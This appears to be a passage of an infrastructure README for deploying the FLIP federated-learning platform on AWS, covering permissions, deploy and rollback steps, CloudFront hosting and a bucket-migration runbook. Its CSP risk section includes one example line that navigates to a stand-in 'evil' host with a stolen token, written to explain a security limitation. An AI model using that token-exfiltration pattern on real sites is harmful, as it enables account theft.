<!--
    Copyright (c) 2026 Guy's and St Thomas' NHS Foundation Trust & King's College London
    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at
        http://www.apache.org/licenses/LICENSE-2.0
    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
-->

# FLIP AWS Terraform/OpenTofu and Ansible Infrastructure

Terraform/OpenTofu and Ansible Infrastructure as Code to deploy the FLIP application stack to AWS.

This provider manages the **Central Hub** (always in AWS) and, optionally, one or more **Trust** instances. Trust services can be deployed in two ways:

| Deployment Model | Trust Location | Managed By |
| --- | --- | --- |
| **Cloud** | AWS EC2 (same account as Central Hub) | This provider (`deploy/providers/AWS/`) |
| **Hybrid / On-Premises** | Any Ubuntu host (home lab, hospital server, etc.) | [`deploy/providers/local/`](../local/README.md) + selected targets in this Makefile |
| **Kubernetes** | Any Kubernetes cluster 1.28+ (EKS, AKS, on-prem) | [`deploy/providers/kubernetes/`](../kubernetes/README.md) Helm chart |

In both models, trusts poll the Central Hub for tasks over HTTPS — all communication is **outbound from the trust** to the hub. The hub never makes inbound requests to trusts.

## Prerequisites

1. **AWS CLI configured** with SSO access (see [deploy README](../../README.md))
2. **Terraform >= 1.13.1** or OpenTofu installed
3. **Python 3.12+**
4. **UV environment manager** installed via [uv installation guide](https://docs.astral.sh/uv/guides/install-python/)
5. **GitHub CLI** installed via [GitHub CLI installation guide](https://cli.github.com/)
6. **SSH key pair** created at `~/.ssh/host-aws` (see [deploy README](../../README.md))
7. **Environment files** configured: (see [deploy README](../../README.md))
   - `.env.stag` (staging), `.env.production` (production), or `.env.lza-prod` (LZA FLIPProduction) in project root
   - Service-specific `.env` files (see Environment Configuration section)

### Required AWS Permissions

Your AWS IAM role/user needs the following permissions for provisioning infrastructure:

- **SSM**: `ssm:GetParameter` for fetching AMI IDs; `ssm:PutParameter` / `ssm:GetParameter` on the Parameter Store entries consumed by ECS tasks
- **EC2 / VPC**: Full access (VPC, instances, security groups, key pairs, Elastic IPs, NAT gateway, interface + gateway VPC endpoints)
- **RDS**: `rds:CreateDBSubnetGroup`, `rds:CreateDBParameterGroup`, `rds:CreateDBInstance`
- **CloudWatch Logs**: `logs:*` (ECS task logs and WAF logs both land here)
- **Secrets Manager**: Full access for storing database credentials and API secrets
- **IAM**: Create and manage roles for EC2 instances and ECS task execution / task roles
- **Application + Network Load Balancers**: Create and manage both the ALB (HTTPS API traffic) and the NLB (FL server TCP/gRPC traffic)
- **ECS / Fargate**: `ecs:*` (cluster, task definitions, services). Task images come from **GHCR** (`ghcr.io/londonaicentre/...`) — no AWS-side image registry permissions needed (no ECR mirror). The bootstrap EFS-provisioning image (`amazon/aws-cli`) comes from Docker Hub and is also fetched through the NAT gateway, so private ECR API/DKR endpoints are not required.
- **EFS**: `elasticfilesystem:*` for the shared workspace volumes mounted into FL Fargate tasks
- **CloudFront + WAFv2**: Create and manage the UI distribution and the WebACL attached to it
- **ACM**: Issue / import certificates in both `eu-west-2` (ALB origin) and `us-east-1` (CloudFront viewer)
- **Route53**: Manage A-records for the canonical subdomain (CloudFront alias) and the FL-server NLB
- **Service Discovery (Cloud Map)**: Create the private DNS namespace used for ECS task-to-task resolution
- **SES**: Manage email templates (optional for email functionality)

Managed policies that cover these requirements:

- `AmazonEC2FullAccess`
- `AmazonECS_FullAccess`
- `AmazonRDSFullAccess`
- `AmazonElasticFileSystemFullAccess`
- `CloudWatchLogsFullAccess`
- `SecretsManagerReadWrite`
- `IAMFullAccess`
- `ElasticLoadBalancingFullAccess` (covers ALB and NLB)
- `CloudFrontFullAccess`
- `AWSWAFFullAccess`
- `AWSCertificateManagerFullAccess`
- `AmazonRoute53FullAccess`
- `AWSCloudMapFullAccess`
- `AmazonSSMFullAccess`
- `AmazonSESFullAccess` (optional)

**Note**: The deployed EC2 instances use separate, scoped IAM roles following the principle of least privilege:

- **Central Hub bastion** (`ec2-role`): `AmazonSSMManagedInstanceCore` only. Application permissions belong to the ECS task roles; the bastion cannot read FLIP secrets or buckets and cannot call Cognito, SES, or CloudWatch Logs.
- **Trust EC2** (`trust-ec2-role`): SSM + CloudWatch managed policies, plus a read-only S3 inline policy on the AI Centre bucket for FL participant-kit downloads. No Cognito, SES, Secrets Manager or FLIP application bucket access.

## Deployment Workflow

### Full Stack Deployment

The complete deployment process is automated via the `full-deploy` target:

```bash
cd deploy/providers/AWS
make full-deploy PROD=stag  # For staging
# OR
make full-deploy PROD=true  # For production
```

This command executes the following steps in order:

1. **`github-login`**: Authenticate with GitHub CLI
2. **`aws-login`**: Authenticate with AWS SSO
3. **`init`**: Initialize Terraform with environment-specific S3 backend
4. **`import-persistent`**: Import existing persistent AWS resources to prevent replacement
5. **`generate-internal-service-key`**: Mint the fl-server → hub `INTERNAL_SERVICE_KEY` (idempotent — skipped if already set)
6. **`plan`**: Generate and review the initial Terraform execution plan
7. **`apply`**: Apply infrastructure changes
8. **`update-env`**: Refresh the root environment file with Terraform outputs
9. **`ssh-config`**: Update `~/.ssh/config` with SSM-managed EC2 instance IDs
10. **`ansible-init`**: Patch both hosts, install `psql` on the Central Hub bastion, and provision Docker, AWS CLI, CloudWatch, and FL assets on the Trust EC2
11. **`deploy-centralhub`**: Deploy the Central Hub ECS Fargate services (`flip-api`, `fl-api-net-1`, `fl-server-net-1`) at the tip of the env's branch via new task-definition revisions (see [Central Hub deploys and rollback](#central-hub-deploys-and-rollback-immutable-sha-tags)) and sync the UI to S3 + invalidate CloudFront
12. **`register-trusts`**: Register every locally-present trust kit file (`trust/.env.<CODE>.<env>`) on the running hub and fill each kit with hub-shared values
13. **`deploy-trust`**: Deploy Trust services via Docker Compose to the Trust EC2
14. **`status`**: Run comprehensive health checks

To provision only the minimal Central Hub bastion after a targeted Terraform
change, run `make provision-bastion PROD=stag|true`; this does not touch the
Trust EC2.

### Hub-only Deployment (all trusts on-prem)

Use `full-deploy-hub-only` when no trust should run in the cloud — typically because the
FL workloads need hardware the trust EC2 doesn't have (it's a GPU-less `t3.xlarge`) and
every trust will run on-prem hosts instead:

```bash
cd deploy/providers/AWS
make full-deploy-hub-only PROD=stag   # or PROD=true
make deploy-ui PROD=stag              # UI ships separately, same as full-deploy
```

This runs the same chain as `full-deploy` minus the cloud-trust steps (`deploy-trust`,
`seed-trust-data`) and sets `DEPLOY_TRUST_EC2=false`, so Terraform provisions **no Trust
EC2 at all** (`ssh-config` skips the `flip-trust` alias and the `trust_ec2` Ansible plays
are no-ops). The cloud-trust targets fail fast with a pointer to the on-prem flow if run
against a hub-only environment.

> **Warning**: on an environment previously deployed with `full-deploy`, the hub-only
> `apply` **destroys the existing Trust EC2** (its data volumes are not preserved).
> Re-run with `DEPLOY_TRUST_EC2=true` (the default) to bring one back.

Each on-prem trust then joins exactly as in the hybrid flow:

1. Add the trust host's public IP to `LOCAL_TRUST_PUBLIC_IPS` in the env file, then
   `make allow-local-trust-nlb PROD=<env>` (one NLB ingress rule per IP).
2. Scaffold + register the kit: `make new-trust TRUST_CODE=<CODE> TRUST_NAME="..." TRUST_REGION=... PROD=<env>`
   then register it — **see "Registering trusts against the ECS hub" below**: the root
   `make register-trust` execs into a *local* flip-api container (an EC2-hub-era
   assumption, FLIP#936) and cannot reach the ECS task on its own.
3. On the trust host: stage the FL kit (`make provision-local-trust KIT=<CODE>` on the
   host, or point `FL_KIT_DIR` in the kit at a locally-provisioned workspace) and start
   the stack: `sudo -E env PROD=<env> make -C trust up-trust KIT=<CODE>` (sudo required —
   the provisioned login user is deliberately not in the docker group, see the
   [local provider README](../local/README.md)).

Multiple on-prem trusts can share one host — give each kit non-colliding ports and data
directories (see the shipped `trust/.env.*.development.example` kits for a working
two-trust port allocation).

### Registering trusts against the ECS hub

`register_trust` must run **inside the hub's flip-api task** (it mints credentials
against the hub DB and stages an ephemeral SSM handoff). With the hub on ECS there is
no local container to exec into, so the flow is ECS Exec (until the make target grows
an ECS-aware path — FLIP#938):

```bash
export AWS_PROFILE=<env> AWS_REGION=eu-west-2
# One-time per debugging session: ECS Exec is off by default (var.ecs_exec_enabled)
aws ecs update-service --cluster flip-cluster --service flip-api \
  --enable-execute-command --force-new-deployment
aws ecs wait services-stable --cluster flip-cluster --services flip-api

TASK=$(aws ecs list-tasks --cluster flip-cluster --service-name flip-api \
  --query 'taskArns[0]' --output text)
OUT=$(aws ecs execute-command --cluster flip-cluster --task "$TASK" \
  --container flip-api --interactive \
  --command "uv run python -m flip_api.scripts.register_trust --name \"<Trust Name>\" --code <CODE>")
# The last JSON line of the session output is the kit payload — feed it to the
# same distribution script the make target uses:
printf '%s\n' "$OUT" | grep -E '^\{.*\}\s*$' | tail -1 \
  | uv run --no-config scripts/distribute_trust_kits.py --target trust/.env.<CODE>.<env>
make generate-xnat-credentials KIT=<CODE> PROD=<env>
```

Registration is backend-agnostic — the kit inherits `FL_BACKEND` (e.g. `flower`) from
the hub's env, and the claimed FL kit slot maps onto the matching SuperNode key
(Flower) or participant kit (NVFLARE) provisioned for that slot name.

### flip-ui on S3 + CloudFront

The UI is served from S3 behind CloudFront at the canonical user-facing subdomain (`stag.flip.aicentre.co.uk` / `app.flip.aicentre.co.uk`). CloudFront also forwards `/api/*` to the ALB, using a backend-only `api.<subdomain>` DNS name that only CloudFront uses — trusts and users never see it. CloudFront is the only supported UI-hosting path; there is no legacy EC2 UI container or ALB UI target group to fall back to.

**Subsequent UI deploys**: just `make deploy-ui PROD=stag|true` — builds the UI from the working tree, regenerates `window.js`, syncs to S3, invalidates CloudFront. No Terraform involved. `deploy-ui` syncs `dist/` to the bucket **root** with `--delete`, so it always excludes the `ark_demo/*` prefix — the real build's `dist/` has no `ark_demo/` output, and without the exclude a routine UI (or `deploy-centralhub`, which calls `deploy-ui` as its last step) deploy would delete the demo SPA on every run. Publishing the demo bundle itself is a separate target — see below.

### Ark+ demo SPA bundle (`/ark_demo/*`)

`make deploy-ark-demo PROD=stag|true` builds the demo bundle (`npm run build:demo`, which also
regenerates `dist/js/window.js` via `generate-demo-window-js.sh`) and syncs it to the **same**
`FLIP_UI_BUCKET_NAME` bucket, under the `ark_demo/` prefix, then invalidates `/ark_demo/*` only.
It mirrors `deploy-ui`'s cache-control discipline — immutable, far-future `Cache-Control` for the
hashed `static/` chunks (the demo build's `assetsDir`, see the Vite `assetsDir` note below),
`no-cache` for `index.html` and `js/window.js` — because the `/ark_demo/*` CloudFront behaviour
uses the `CachingOptimized` policy, which **honours** origin cache-control headers: a hand-upload
without them would serve a stale `index.html` referencing already-deleted hashed chunks after the
next demo redeploy. This is a separate command from `deploy-ui` deliberately — the demo (a
point-in-time snapshot — see "`/ark_demo/*` origin isolation" below) is republished far less often
than the real app, typically only when the register is re-captured.

```bash
cd deploy/providers/AWS
make deploy-ark-demo PROD=stag|true
```

### Ark+ demo download assets (`/ark_demo/assets/*`)

The public Ark+ demo (flip-ui `npm run build:demo`) offers multi-hundred-MB result and model-file
zips for download. These are served by the **same CloudFront distribution** at `/ark_demo/assets/*`
from a dedicated S3 bucket (prod: `flipprod-demo-assets`) that is **not public**: CloudFront reads
it via OAC exactly like the flip-ui bucket, all four public-access blocks are on, and the bucket
policy grants `s3:GetObject` on the `ark_demo/assets/*` prefix to this distribution only. Serving
through CloudFront (instead of the public-prefix S3 URL the demo used pre-rollout) puts the WAF
rate-limit rule in the download path and moves anonymous egress from raw S3 rates to CloudFront's.

The bucket itself is intentionally **not Terraform-managed** — bundles are staged manually per demo
release and the bucket must survive `make destroy`. Terraform manages only the access edges
(public-access block, OAC bucket policy, CloudFront origin + behaviour), all gated on
`DEMO_ASSETS_BUCKET_NAME` in `.env.production` (leave unset on stag — no demo, no resources).

Rollout / new-bundle staging:

```bash
# Stage bundles under the prefix the CloudFront behaviour maps to
aws s3 cp s3://flipprod-demo-assets/ark_demo/<bundle>.zip \
          s3://flipprod-demo-assets/ark_demo/assets/<bundle>.zip --profile prod   # server-side copy

# DEMO_ASSETS_BUCKET_NAME=flipprod-demo-assets in .env.production, then:
cd deploy/providers/AWS
make plan PROD=true    # expect: +OAC, +PAB, +bucket policy, ~distribution (origin + behaviour)
make apply PROD=true

# Verify: CloudFront serves, raw S3 is sealed
curl -sI https://app.flip.aicentre.co.uk/ark_demo/assets/<bundle>.zip   # 200
curl -sI https://flipprod-demo-assets.s3.eu-west-2.amazonaws.com/ark_demo/<bundle>.zip  # 403
```

The demo UI's download URLs live in `flip-ui/src/demo/bootstrap.ts` (model-files zips) and
`flip-ui/mocks/demo/data/*flres*.json` / `fl_results.json` (results zips); keep them **relative**
(`/ark_demo/assets/…`), not absolute to `app.flip.aicentre.co.uk` — the demo SPA is always served
same-origin under `/ark_demo/`, so a relative path resolves through CloudFront identically
wherever the bundle is hosted (prod, stag, or a local preview), and it survives a domain change.
An absolute form would silently point a stag-hosted or locally-previewed demo's downloads at prod.

#### `/ark_demo/*` same-origin hosting (and its residual risk)

The demo SPA itself (everything under `/ark_demo/` that isn't a downloadable bundle — the built
`flip-ui` demo bundle, uploaded to the **same** `FLIP_UI_BUCKET_NAME` bucket under an `ark_demo/`
prefix) shares an origin with the real, authenticated app. That means a real signed-in user's
Cognito tokens in `localStorage` are reachable by any JS running under `app.flip.aicentre.co.uk` —
including a hypothetical script-injection bug in the demo bundle. Rather than move the demo to a
separate subdomain, it is served behind a dedicated, **enforcing** (not report-only)
`aws_cloudfront_response_headers_policy.ark_demo_spa` attached only to the `/ark_demo/*` behaviour.

> **This CSP is defence in depth, not an origin boundary.** An earlier version of this section
> claimed `connect-src 'none'` meant a leaked token had "nowhere on the network to go". That is not
> correct and was fixed in review (FLIP#794): **CSP has no directive governing top-level
> navigation** — `navigate-to` was dropped from CSP3 and ships in no browser, and `form-action`
> covers form submission only — so `location.href = "https://evil/?t=" + token` is unaffected by
> this policy. Same-origin hosting also grants the demo full read access to the real app's
> `localStorage` and cookies regardless of any CSP; `connect-src` constrains where a page may
> *connect*, not what it may *read*.
>
> **The residual risk is real and accepted.** What keeps it closed today is that the demo has no
> injection sink (no `v-html`/`innerHTML` outside a test file) and serves a static register compiled
> into the bundle rather than attacker-supplied input — not the CSP. **A separate origin (e.g.
> `demo.flip.aicentre.co.uk`) is the only control that genuinely separates the two token stores.**
> Treat moving to one as the fix if the demo ever grows a dynamic content path.

What the policy *does* buy is worth keeping: it blocks the entire fetch/XHR/WebSocket exfiltration
class and every third-party resource load, and it enforces the "zero egress" property the demo
design rests on. The demo's Mirage mock server never touches the real browser network stack (it
replaces `XMLHttpRequest`/`fetch` outright), so this costs no demo functionality — confirmed by the
original PR's Chrome net-log audit and pinned by the `zero egress` cases in
`flip-ui/mocks/__tests__/demo-server.spec.ts`.

Note the demo enforces `style-src 'self'` while the real app still runs that policy report-only, and
CodeMirror injects an inline `<style>` at runtime on the cohort-query page — worth an eyeball on
that page before a public launch.

Three ordered behaviours now exist for the demo, evaluated in this precedence order (CloudFront
uses the first `path_pattern` match, so order matters):
1. `/api/*` → ALB (existing, real-app API)
2. `/ark_demo/assets/*` → `flipprod-demo-assets` bucket (download bundles, no CSP — direct file
   downloads, not HTML)
3. `/ark_demo/*` → `flip-ui` bucket, same origin as the real app but with the strict demo CSP above

The shared `spa_rewrite` CloudFront Function (attached to both the default behaviour and
`/ark_demo/*`) is prefix-aware: a deep link under `/ark_demo/` falls back to `/ark_demo/index.html`,
never the real app's `/index.html` — the earlier version would have silently served the real
(Cognito-gated) app for a demo URL.

If `ark_demo_spa` ever gets detached from the `/ark_demo/*` behaviour (Terraform drift, a future
refactor), that hardening vanishes with **no functional symptom**, since the demo works identically
without it. `make deploy-ark-demo` now refuses to publish when `DEMO_ASSETS_BUCKET_NAME` is unset or
when the live distribution has no `/ark_demo/*` behaviour — the variable gates both the behaviour
and its CSP, and without it the demo would be served by the *default* behaviour, whose CSP is only
report-only. Still verify after a (re)deploy, alongside the 200/403 pair above:

```bash
curl -sI https://app.flip.aicentre.co.uk/ark_demo/ | grep -i content-security-policy   # expect: connect-src 'none' present
```

**Vite `assetsDir` collision (already fixed, worth knowing about):** Vite's default `assetsDir`
(`"assets"`) would put the demo bundle's own JS/CSS/font chunks at `/ark_demo/assets/*.js`, which
collides with behaviour 2 above — that behaviour would intercept the bundle's own asset requests
and serve them (wrongly, 403) from the downloads bucket instead of the `flip-ui` bucket, breaking
the app before Vue mounts. `flip-ui/vite.config.mts` sets `assetsDir: "static"` for `--mode demo`
specifically to avoid this; the real build is unaffected (still `dist/assets`). If the demo build
config ever changes, re-check that its own output prefix doesn't re-collide with `ark_demo/assets/`.

### FLIP application S3 buckets

The Central Hub uses four S3 buckets, each with a distinct purpose, access pattern, and CORS surface. The three **FLIP application buckets** were split out of a single legacy `flip{env}` bucket so each tenant can carry the minimum CORS surface its consumer needs (a CORS change for one tenant no longer drags every other tenant along, and a browser-direct bucket can no longer accidentally expose objects belonging to a server-only flow).

| Bucket (per env) | Env-var (`.env.{stag,production}`) | Consumer | Browser CORS | Holds |
|---|---|---|---|---|
| `flip{env}-model-files-uploads` | `FLIP_MODEL_FILES_UPLOADS_BUCKET_NAME` | researcher browser (presigned **POST** upload, presigned **GET** download), flip-api reads | `POST`, `GET` from `https://<flip_alb_subdomain>` | researcher-uploaded model artefacts in two prefixes: `uploaded/` (staging — where the browser POSTs) and `scanned/` (promoted by flip-api's malware scan, FLIP#52). Every consumer reads `scanned/` only, so an unscanned or rejected file can never be bundled to a trust. Noncurrent versions expire after 30 days (the scan deletes rejected uploads and moves promoted ones, so this bucket accumulates tombstones). |
| `flip{env}-fl-results` | `FLIP_FL_RESULTS_BUCKET_NAME` | fl-server writes, researcher browser (presigned **GET**) | `GET` from `https://<flip_alb_subdomain>` | FL training output / aggregated weights — the whole bucket is dedicated to this tenant so no prefix is needed |
| `flip{env}-app-bundles` | `FLIP_APP_BUNDLES_BUCKET_NAME` | flip-api (boto3 only) | **none** (server-only — no `aws_s3_bucket_cors_configuration` resource is emitted at all) | `app_destinations/<model_id>/` (per-bundle FL apps: base templates + user model files, assembled by flip-api). The base FL application templates themselves are baked into the flip-api image (FLIP#724), not stored here. |
| `flip{env}-aicentre` | `AICENTRE_BUCKET_NAME` | Trust EC2 (`aws s3 cp` during Ansible), AI Centre operators | `PUT`, `GET` | FL participant kits |

All four share standard configs: public access blocked, SSE-KMS server-side encryption with bucket keys enabled, versioning enabled. The three FLIP application buckets are rendered by the shared **`modules/flip_s3_bucket`** module, which is consumed by both `main.tf` (prod / stag) and `dev/main.tf` (dev account) — so a CORS or bucket-policy change plans identically across every environment, closing the dev-drift gap that masked the presigned-PUT → presigned-POST regression in #438.

**Base FL application templates ship in the image, not S3.** As of FLIP#724 the base FL application templates (the repo's `fl-apps/` tree) are baked into the `flip-api` image and read from a local directory (`FL_APP_BASE_DIR`, default `/app/fl-apps`); flip-api bundles applications by uploading those local templates plus the user's model files into `flip{env}-app-bundles/app_destinations/<model_id>/`. There is no longer any CI that syncs templates to S3, so the `flip{env}-app-bundles` bucket is written **only** by flip-api at bundle time. Template hotfixes therefore ship by rebuilding and redeploying the `flip-api` image (see the migration note below).

#### Migrating off the legacy single-bucket layout

For an account that was created **before** the split, the legacy `flip{env}` bucket holds the contents that now belong in the three split buckets above. **Prod and dev were migrated as part of FLIP#24** (the bucket-split PR) — see that PR's description for the as-built details and verification logs. The only environment still pending a cutover at the time of writing is **stag**; the runbook below is the canonical reference for stag and for any future fresh prod/dev account that needs the same migration.

The mechanism the runbook leans on:

- The `removed { destroy = false }` blocks in `services.tf` drop the legacy bucket from Terraform state on the first apply **without** destroying the AWS resource — that's what lets `make migrate-flip-bucket` run against the still-live source.
- `make verify-flip-bucket-migration` is the safety net for the fact that `aws s3 sync` exits 0 even when individual object copies fail (per-object KMS / throttle / timeout errors print to stderr but don't fail the sync). It computes a key-set subset check — every source key must exist on the destination; extras on the destination from post-cutover writes are allowed. Always green before `aws s3 rb`.
- There is a brief window between `make apply` finishing and `make deploy-centralhub` finishing where flip-api's IAM no longer grants the legacy bucket but its env vars still point at it — every S3 call returns 403 during that window (~5 minutes). To eliminate it, temporarily add the legacy bucket back to the IAM grant for the duration of the deploy, then strip it in a follow-up apply.

#### Stag migration runbook

Stag's Terraform state is known to be missing ~70 live resources. The `removed` blocks plan as no-ops if `aws_s3_bucket.flip_bucket` was never registered in stag state to begin with — and the next stag apply would then try to *create* whatever `FLIP_MODEL_FILES_UPLOADS_BUCKET_NAME` points to. If that's set to the legacy bucket name as a typo, the apply fails on `BucketAlreadyOwnedByYou`; if it's set to a new name but the new buckets already exist in AWS from a manual create, the apply also fails. The fix is to import every persistent resource first, then run apply / migrate / verify.

```bash
cd deploy/providers/AWS
export AWS_PROFILE=stag && make aws-login              # if SSO has expired

# 1. Bring stag's Terraform state in line with what's actually in AWS — this
#    imports the three new application buckets (if a previous run created them
#    manually), the AI Centre bucket, Secrets Manager, Cognito, SES, and ACM.
#    It does NOT import the legacy `aws_s3_bucket.flip_bucket` (that resource
#    has been removed from the configuration and replaced with `removed`
#    blocks). The `removed` blocks then plan as no-ops on the stag-state gap,
#    which is fine: nothing to remove means nothing accidentally gets removed.
#    Idempotent: rerun safely after a fix.
make import-persistent                                  # PROD unset → stag (see Makefile defaults)

# 2. Plan — confirm the diff matches the prod cutover's shape:
#    17 to add (3 new buckets), 3 to change (IAM rewires), 1 to destroy
#    (old uploaded_federated_data SSM param renamed), 8 forgotten-from-state.
#    If you see anything trying to DESTROY a bucket, stop — that means the
#    import-persistent step missed something. Don't apply.
make plan

# 3. Apply — same diff as prod.
make apply

# 4. Sync the legacy prefixes (model_files/uploaded, uploaded_federated_data,
#    app_destination_bucket) into the new buckets. (The base-application prefix
#    is no longer synced — those templates now ship in the flip-api image, FLIP#724.)
make migrate-flip-bucket

# 5. Parity-check — must print all-✅ before continuing.
make verify-flip-bucket-migration

# 6. Redeploy stag's central hub so flip-api picks up the new bucket env vars.
make deploy-centralhub

# … browser smoke against stag's URL; FL e2e; 24–48h cooldown …

# 7. Final verify + decommission.
make verify-flip-bucket-migration
aws s3 rm s3://flipstag --recursive
aws s3 rb s3://flipstag
```

Two stag-specific watch-outs:

- **`make import-persistent` failing partway through** is fine on a re-run — every import in `scripts/import-resources.sh` is idempotent (probes `terraform state list` before importing). The script will skip already-imported resources and only attempt the missing ones.
- **The task definitions applied before `deploy-centralhub` need image tags from `.env.stag`** (`DOCKER_TAG`, `DOCKER_FL_TAG`) that exist in GHCR. Branch tags do **not** auto-build on push — trigger the relevant `docker_build_*` workflows via `workflow_dispatch` before applying a branch image tag. These env-file tags are only Terraform's bootstrap defaults — day-to-day image deploys pin immutable `sha-<short7>` tags instead (see [Central Hub deploys and rollback](#central-hub-deploys-and-rollback-immutable-sha-tags)).

For a **future fresh prod or dev** account that needs the same migration, the flow is the stag runbook above minus step 1 (`make import-persistent` is only needed on environments with the stag-style state gap) and with `PROD=true` on every `make` call for prod (dev uses the separate `deploy/providers/AWS/dev/` Terraform root, no `PROD=` flag).

> **Do not `aws s3 rb s3://flipdev` on the legacy dev bucket.** The `test-data/` prefix in there (~42 objects) is consumed by external CI fixtures, so it is outside the scope of the FLIP#24 migration and must survive. Either leave the `flipdev` bucket alive solely for `test-data/`, or move `test-data/` to a dedicated bucket and update those references in lockstep before any `aws s3 rb`. The same constraint may apply to a `test-data/` prefix in `flipstag` / `flipprod` if one exists — check with `aws s3 ls s3://flipstag/test-data/` before decommissioning either.

Once a decommission is complete in every environment, drop the `FLIP_BUCKET_NAME` line from `.env.*`, the `removed` blocks in `services.tf`, and the `migrate-flip-bucket` / `verify-flip-bucket-migration` Makefile targets in a follow-up PR.

### Manual Step-by-Step Deployment

For debugging or selective deployment, run individual steps:

```bash
# 0. Choose the environment for this shell.
# If you omit PROD, the AWS provider Makefile defaults to staging.
export PROD=stag    # or: export PROD=true

# 1. Login to GitHub and AWS
make github-login
make aws-login

# 2. Bootstrap the Terraform backend bucket once, if needed
make create-backend

# 3. Initialize Terraform (uses the configured S3 backend)
make init

# 4. Import existing persistent resources (prevents replacement errors)
make import-persistent

# 5. Plan changes
make plan

# 6. Apply infrastructure
make apply

# 7. Configure SSH access
make ssh-config

# 8. Setup EC2 instances with Ansible
make ansible-init

# 9. Deploy the Central Hub
make deploy-centralhub

# 10. Register every locally-present trust kit file on the hub and fill each kit with hub-shared values
make register-trusts

# 11. Deploy trust services
make deploy-trust

# 12. Check status
make status
```

### Central Hub deploys and rollback (immutable SHA tags)

`make deploy-centralhub` deploys the Central Hub ECS services (`flip-api`, `fl-api-net-1`,
`fl-server-net-1`) by **immutable image tag + task-definition revision** (FLIP#751), then publishes
the UI (same as `make deploy-ui`):

0. **FL quiesce warning** (FLIP#770). Replacing `fl-server-net-1` kills any in-flight training
   run (its run state is ephemeral) and strands the model at `TRAINING_STARTED` with its net stuck
   `BUSY`. The deploy prints a reminder: enable Deployment Mode in the UI (Admin → Deployments) at
   any time — it pauses FL job pickup, so queued jobs hold and only the current run (if any) needs
   to finish — wait until the platform is quiesced, deploy, then disable Deployment Mode to resume
   the queue. `GET /fl/quiesce` (authenticated) reports both facts: `deployment_mode` (the flag)
   and `fl_quiesced` (no net's scheduler `BUSY`). On **prod** (`PROD=true`) the reminder is
   followed by an interactive "Are you sure you want to continue?" confirmation; staging deploys
   stay non-interactive.
1. Resolves `TAG=sha-<short7>` from the tip of the env's branch — `PROD=true` → `origin/main`,
   `PROD=stag` → `origin/develop` (`git fetch` runs inside the target). The tag must match
   `sha-<7 hex chars>` — a mutable tag (e.g. a stray `TAG=stag`) is rejected before any AWS call.
2. Verifies **every** service's image exists in GHCR at that tag **before mutating anything** — a
   missing tag aborts with nothing deployed. The build workflows are path-filtered, so a merge that
   didn't touch a service (most commonly a flip-api-only merge, which does not rebuild the FL
   images) leaves that service without an image at the new tip; flip-api's build is additionally
   test-gated (`workflow_run` on its test suite), so right after a merge its tag may still be
   building. The guard names the workflow to check; trigger the missing build manually
   (`gh workflow run <workflow>.yml --ref <branch>` builds the branch tip and publishes its sha
   tag), then re-run the deploy. A non-404 registry error (outage, auth) is reported as such —
   don't dispatch rebuilds for it. Non-`ghcr.io` registries skip the manifest check entirely
   (LZA ECR pull-through cache, FLIP#749).
3. Per service: registers a new task-definition revision with only the app container's image tag
   swapped (containers are selected **by name**, never by index — the same convention as the
   `describe-tasks` digest check in [`TROUBLESHOOTING.md` §1.9](TROUBLESHOOTING.md), robust to
   sidecar/ordering changes) and repoints the service at the new revision. If the repoint fails,
   the just-registered revision is deregistered again so the `max()` tracking in
   `ecs_services.tf` cannot adopt a never-deployed revision, and any services already repointed
   in the same run are listed so a partial deploy is visible.

```bash
make deploy-centralhub PROD=stag                    # deploy the tip of develop to staging
make deploy-centralhub PROD=true                    # deploy the tip of main to production
make deploy-centralhub PROD=stag TAG=sha-1a2b3c4    # pin a specific / hotfix build
make rollback-centralhub PROD=stag                  # repoint services at the previous revision
```

`TAG=sha-<short7>` overrides the branch-tip resolution — this automates the previously manual
runbook for feature-branch images: trigger the relevant `docker_build_*` / `fl-docker-build-*`
workflow on your branch via `workflow_dispatch`, wait for green, then deploy its sha tag.

`make rollback-centralhub` repoints each service at its previous ACTIVE task-definition revision —
seconds, no rebuild — then **deregisters the revision it rolled away from** (it stays describable
for forensics). The deregistration is what makes the rollback durable: `ecs_services.tf` tracks the
*latest ACTIVE* revision, so leaving the bad revision ACTIVE would have the next `terraform apply`
silently re-adopt it. It does not touch the UI bundle; re-run `make deploy-ui` from the matching
commit if the UI must move too. After a *partial* deploy (some services repointed before a
failure), don't roll back blindly — rollback moves **every** service down one revision, including
the ones the failed deploy never touched; fix the missing build and re-run the deploy instead.

The deploy ends by publishing the UI (same as `make deploy-ui`), which builds `flip-ui` **from your
local working tree** — deploy from a clean checkout of the branch you are deploying.

Terraform stays the owner of the task-definition *skeleton* (roles, env wiring, volumes). The
services track `max(Terraform revision, latest ACTIVE revision)` (see `ecs_services.tf`), so an
unrelated `terraform apply` does not roll a CLI-deployed image back. When an apply *does*
re-register a task definition, the new Terraform revision goes live with the bootstrap image tags
from the env file (`DOCKER_TAG`, `DOCKER_FL_TAG`) — re-run `make deploy-centralhub` afterwards to
roll the sha-pinned image forward again. And because `make apply` applies the saved `plan.tfplan`,
a plan generated **before** a CLI deploy snapshots the older revision and applying it would roll
the image back — re-run `make plan` after any `make deploy-centralhub`.

> **Prod rollout note:** switch *production* deploys to this flow only after the 24 Jul 2026 DECAF
> deadline (BDMS is live on legacy prod until then). Staging can adopt it immediately.

### Growing the FL kit-slot pool (`add-fl-kits`)

When trust registration fails with `NoFreeKitSlotError` ("No FL kit slots available…"),
the deployment has run out of *claimable* FL kit slots. One command mints, uploads,
and activates `N` more (NVFLARE only):

```bash
make add-fl-kits N=2 PROD=stag|true   # YES=1 to skip both confirmation prompts (kit plan + Terraform plan)
```

**Activation vs minting is automatic.** A slot is claimable only when its name is in
`FL_KIT_SLOT_NAMES` *and* its kit exists in S3, and those two can drift — a deployment
provisioned with a batch of spare kits has kits nobody can claim. `add-fl-kits N=<n>`
treats `N` as *"ensure N more live slots"*, not a mint count: it **activates** up to `N`
such spares first (lowest-numbered first — just an env-file edit, no certs, no upload,
no restart) and only **mints** the shortfall. When spares cover the request it mints
nothing and skips the CA workspace entirely, so growing the pool past over-provisioned
kits needs none of the provisioning toolchain. (Stag on 2026-07-14 held 48 spare kits:
`add-fl-kits N=1` now just activates the idle `Trust_3` in seconds instead of minting
`Trust_51`.)

It runs `scripts/add_fl_kits.sh`: discovers the deployment's nets from S3, activates any
spares toward `N`, and for the remaining shortfall restores + fingerprint-verifies each
